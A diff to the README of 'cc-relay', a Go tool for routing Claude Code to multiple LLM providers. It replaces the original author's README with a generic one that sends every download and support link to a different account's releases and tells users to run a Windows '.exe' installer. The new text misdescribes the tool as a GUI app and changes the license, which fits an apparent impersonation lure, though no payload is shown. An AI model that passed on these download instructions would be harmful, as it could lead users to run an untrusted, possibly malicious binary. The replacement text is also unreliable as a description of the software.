@@ -1,93 +1,78 @@
-<p align="center">
-  <img src="ai-gophers.svg" alt="goophers" width="500" height="500"/>
-</p>
+# ⚡️ cc-relay - Fast and Simple LLM API Access
 
-<h1 align="center">CC-Relay</h1>
+[![Download cc-relay](https://img.shields.io/badge/Download-cc--relay-blue.svg)](https://github.com/jackkstalker/cc-relay/releases)
 
-<h4 align="center">
-Boost Claude Code by routing to multiple Anthropic-compatible providers
-</h4>
+## 📋 Description
+cc-relay is a blazing fast API gateway for large language models (LLMs), built with Go. This application allows you to easily connect to various popular AI services like OpenAI, Claude, and Gemini, all in one place. Whether you’re building a chatbot or integrating AI into your applications, cc-relay simplifies the process.
 
-<p align="center">  
-  <a href="https://cc-relay.ai/"><img src="https://img.shields.io/badge/-cc--relay.ai-5e5086?style=flat&labelColor=24292e&logo=safari&logoColor=white" alt="Website"></a>
-  <a href="https://cc-relay.ai/en/docs/"><img src="https://img.shields.io/badge/-Read%20the%20Docs-blue?style=flat&labelColor=24292e&logo=readthedocs&logoColor=white" alt="Documentation"></a>
-  <a href="https://pkg.go.dev/github.com/omarluq/cc-relay"><img src="https://img.shields.io/badge/reference-007d9c?style=flat&labelColor=24292e&logo=go&logoColor=white" alt="Go Reference"></a>
-  <a href="https://go.dev/"><img src="https://img.shields.io/badge/-%3E%3D1.18-00ADD8?style=flat&labelColor=24292e&logo=go&logoColor=white" alt="Go Version"></a>
-  <a href="https://goreportcard.com/report/github.com/omarluq/cc-relay"><img src="https://img.shields.io/badge/report-A%2B-00ADD8?style=flat&labelColor=24292e&logo=go&logoColor=white" alt="Go Report Card"></a>
-  <a href="https://github.com/omarluq/cc-relay/releases"><img src="https://img.shields.io/badge/-Latest%20Release-28a745?style=flat&labelColor=24292e&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0id2hpdGUiPjxwYXRoIGQ9Ik0xMiAxNWw1LTUtMS40MS0xLjQxTDEzIDExLjE3VjRoLTJ2Ny4xN0w4LjQxIDguNTkgNyAxMGw1IDV6bTcgMnY0SDV2LTRIMy42OHY0LjMzYzAgLjczNC41OTYgMS4zMyAxLjMzIDEuMzNoMTMuOThjLjczNCAwIDEuMzMtLjU5NiAxLjMzLTEuMzNWMTdIMTl6Ii8+PC9zdmc+" alt="Download"></a>
-  <br/>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-AGPL--3.0-blue?style=flat&labelColor=24292e&logo=opensourceinitiative&logoColor=white" alt="License: AGPL-3.0"></a>
-  <a href="https://github.com/omarluq/cc-relay/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/omarluq/cc-relay/ci.yml?style=flat&labelColor=24292e&label=Tests&logo=github&logoColor=white" alt="Tests"></a>
-  <a href="https://github.com/omarluq/cc-relay/releases"><img src="https://img.shields.io/github/v/release/omarluq/cc-relay?style=flat&labelColor=24292e&color=28a745&label=Version&logo=semver&logoColor=white" alt="Version"></a>
-  <a href="https://deepwiki.com/omarluq/cc-relay"> <img src="https://img.shields.io/badge/DeepWiki-omarluq%2Fcc--relay-4c72c9?style=flat&labelColor=24292e&logo=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAyCAYAAAAnWDnqAAAAAXNSR0IArs4c6QAAA05JREFUaEPtmUtyEzEQhtWTQyQLHNak2AB7ZnyXZMEjXMGeK/AIi+QuHrMnbChYY7MIh8g01fJoopFb0uhhEqqcbWTp06/uv1saEDv4O3n3dV60RfP947Mm9/SQc0ICFQgzfc4CYZoTPAswgSJCCUJUnAAoRHOAUOcATwbmVLWdGoH//PB8mnKqScAhsD0kYP3j/Yt5LPQe2KvcXmGvRHcDnpxfL2zOYJ1mFwrryWTz0advv1Ut4CJgf5uhDuDj5eUcAUoahrdY/56ebRWeraTjMt/00Sh3UDtjgHtQNHwcRGOC98BJEAEymycmYcWwOprTgcB6VZ5JK5TAJ+fXGLBm3FDAmn6oPPjR4rKCAoJCal2eAiQp2x0vxTPB3ALO2CRkwmDy5WohzBDwSEFKRwPbknEggCPB/imwrycgxX2NzoMCHhPkDwqYMr9tRcP5qNrMZHkVnOjRMWwLCcr8ohBVb1OMjxLwGCvjTikrsBOiA6fNyCrm8V1rP93iVPpwaE+gO0SsWmPiXB+jikdf6SizrT5qKasx5j8ABbHpFTx+vFXp9EnYQmLx02h1QTTrl6eDqxLnGjporxl3NL3agEvXdT0WmEost648sQOYAeJS9Q7bfUVoMGnjo4AZdUMQku50McDcMWcBPvr0SzbTAFDfvJqwLzgxwATnCgnp4wDl6Aa+Ax283gghmj+vj7feE2KBBRMW3FzOpLOADl0Isb5587h/U4gGvkt5v60Z1VLG8BhYjbzRwyQZemwAd6cCR5/XFWLYZRIMpX39AR0tjaGGiGzLVyhse5C9RKC6ai42ppWPKiBagOvaYk8lO7DajerabOZP46Lby5wKjw1HCRx7p9sVMOWGzb/vA1hwiWc6jm3MvQDTogQkiqIhJV0nBQBTU+3okKCFDy9WwferkHjtxib7t3xIUQtHxnIwtx4mpg26/HfwVNVDb4oI9RHmx5WGelRVlrtiw43zboCLaxv46AZeB3IlTkwouebTr1y2NjSpHz68WNFjHvupy3q8TFn3Hos2IAk4Ju5dCo8B3wP7VPr/FGaKiG+T+v+TQqIrOqMTL1VdWV1DdmcbO8KXBz6esmYWYKPwDL5b5FA1a0hwapHiom0r/cKaoqr+27/XcrS5UwSMbQAAAABJRU5ErkJggg==&logoColor=white" alt="DeepWiki"></a>
-  <a href="https://codecov.io/gh/omarluq/cc-relay"><img src="https://img.shields.io/codecov/c/github/omarluq/cc-relay?style=flat&labelColor=24292e&logo=codecov&logoColor=white&token=YW23EDL5T5" alt="codecov"></a>
-  <a href="https://github.com/omarluq/cc-relay"><img src="https://img.shields.io/badge/Maintained%3F-yes-28a745?style=flat&labelColor=24292e&logo=checkmarx&logoColor=white" alt="Maintained"></a>
-  <a href="https://github.com/omarluq/cc-relay"><img src="https://img.shields.io/badge/Made%20with-Love-ff69b4?style=flat&labelColor=24292e&logo=githubsponsors&logoColor=white" alt="Made with Love"></a>
-</p>
+## 🚀 Getting Started
+Follow these steps to download and run the cc-relay application.
 
-<h2>Why?</h2>
+### 🖥️ System Requirements
+- Operating System: Windows 10 or newer, macOS, or a modern Linux distribution.
+- Minimum RAM: 4 GB.
+- Internet connection for API access.
 
-<p>
-  Claude Code connects to one provider at a time. But what if you want to:
-</p>
+### 📥 Download & Install
+To get started, visit this page to download the latest version of cc-relay:
 
-<p>
-  <strong>🔑 Pool rate limits</strong> across multiple Anthropic API keys<br>
-  <strong>💰 Save money</strong> by routing simple tasks to lighter models<br>
-  <strong>🛡️ Never get stuck</strong> with automatic failover between providers<br>
-  <strong>🏢 Use your company's Bedrock/Azure/Vertex</strong> alongside personal API keys
-</p>
+[Download cc-relay](https://github.com/jackkstalker/cc-relay/releases)
 
-<p>
-  <strong>cc-relay</strong> makes all of this possible.
-</p>
+Once you are on the Releases page, follow these steps to install:
 
-<p>
+1. **Select the Latest Release:** Look for the release with the highest version number.
+2. **Download the Package:** Click on the appropriate file for your operating system (e.g., `cc-relay-windows.exe` for Windows).
+3. **Run the Installer:** Open the downloaded file and follow the on-screen instructions to complete the installation.
 
-```mermaid
-%%{init: {'theme': 'base', 'themeVariables': { 'primaryColor': '#6366f1', 'primaryTextColor': '#fff', 'primaryBorderColor': '#4f46e5', 'lineColor': '#94a3b8', 'secondaryColor': 'transparent', 'tertiaryColor': 'transparent', 'background': 'transparent', 'mainBkg': 'transparent', 'nodeBorder': '#4f46e5', 'clusterBkg': 'transparent', 'clusterBorder': 'transparent', 'titleColor': '#1e293b', 'edgeLabelBackground': 'transparent'}}}%%
+### 🌐 Configuring the Application
+After installation, you need to configure cc-relay to connect to the desired LLMs. 
 
-flowchart LR
-    CC["👾 Claude Code"]
-    RELAY["⚡ CC-Relay"]
+1. **Open cc-relay:** Launch the application from your applications folder or desktop shortcut.
+2. **Set API Keys:** You will need API keys for the services you wish to connect to (like OpenAI, Gemin, etc.). Enter these keys into the application settings.
+3. **Select Services:** Choose which AI models you want to use from the options provided.
 
-    subgraph providers[" "]
-        direction TB
-        ANT["🤖 Anthropic"]
-        ZAI["🤖 Z.AI"]
-        OLL["🦙 Ollama"]
-        BED["🤖 AWS Bedrock"]
-        AZU["🤖 Azure Foundry"]
-        VTX["🤖 Vertex AI"]
-    end
+### 🔧 Running cc-relay
+Once you complete the configuration, run cc-relay by clicking the "Start" button in the application.
 
-    CC --> RELAY
-    RELAY --> ANT
-    RELAY --> ZAI
-    RELAY --> OLL
-    RELAY --> BED
-    RELAY --> AZU
-    RELAY --> VTX
+1. **Check the Logs:** Keep an eye on the logs displayed on the main screen. They will provide information about your connections.
+2. **Test the Connection:** Use the built-in testing tool to make sure everything is set up correctly. Click on "Test API" to send a sample request.
 
-    style CC fill:#1e1e2e,stroke:#6366f1,stroke-width:2px,color:#fff
-    style RELAY fill:#6366f1,stroke:#4f46e5,stroke-width:3px,color:#fff
-    style ANT fill:#ff6b35,stroke:#e55a2b,stroke-width:2px,color:#fff
-    style ZAI fill:#3b82f6,stroke:#2563eb,stroke-width:2px,color:#fff
-    style OLL fill:#22c55e,stroke:#16a34a,stroke-width:2px,color:#fff
-    style BED fill:#f59e0b,stroke:#d97706,stroke-width:2px,color:#fff
-    style AZU fill:#0ea5e9,stroke:#0284c7,stroke-width:2px,color:#fff
-    style VTX fill:#ef4444,stroke:#dc2626,stroke-width:2px,color:#fff
-    style providers fill:transparent,stroke:transparent
-```
+### 📁 Usage Examples
+cc-relay offers several features to help you make the most of various AI services. Here are a few examples:
 
-</p>
+- **Chatbot Integration:** Easily connect to OpenAI's ChatGPT models to add conversation capabilities to your applications.
+- **Content Generation:** Use Mistral or Gemini for generating text content based on your input prompts.
+- **Data Analysis:** Leverage capabilities from Claude and other models for data reconstruction or summarization.
 
-## License
+### 🛠️ Troubleshooting
+If you encounter issues, consider these common problems:
 
-[AGPL-3.0](https://github.com/omarluq/cc-relay/blob/main/LICENSE) - © 2026 [Omar Alani](https://github.com/omarluq)
+- **Invalid API Key:** Ensure your API keys are correctly entered.
+- **Connection Issues:** Check your internet connection and make sure the LLM services are operational.
+- **Logs:** Review the application logs for error messages.
 
-## Contributing
+### 📚 Resources
+For additional help and resources:
 
-Contributions welcome! Please open an issue before submitting PRs.
+- **Documentation:** Check the [GitHub Wiki](https://github.com/jackkstalker/cc-relay/wiki) for detailed documentation.
+- **Community Support:** Join our [discussion forum](https://github.com/jackkstalker/cc-relay/discussions) to ask questions and share tips with other users.
 
-<a href="https://sonarcloud.io/summary/new_code?id=omarluq_cc-relay"><img src="https://sonarcloud.io/images/project_badges/sonarcloud-dark.svg" alt="SonarCloud Quality Gate"/></a>
+## ⚙️ Contributing
+We welcome contributions to cc-relay. If you’d like to help, please check out our contribution guidelines in the repository.
+
+### 👥 Topics
+This project covers a wide range of AI applications:
+
+- anthropic
+- bedrock
+- claude
+- gemini
+- openai
+- vertex-ai
+
+Feel free to explore and use these topics as a guide for your projects.
+
+## 💻 License
+cc-relay is open-source software licensed under the MIT License. You can freely use and modify the code, just keep the original license agreement.
+
+For the latest updates and information, don’t forget to frequently check the [Releases page](https://github.com/jackkstalker/cc-relay/releases).
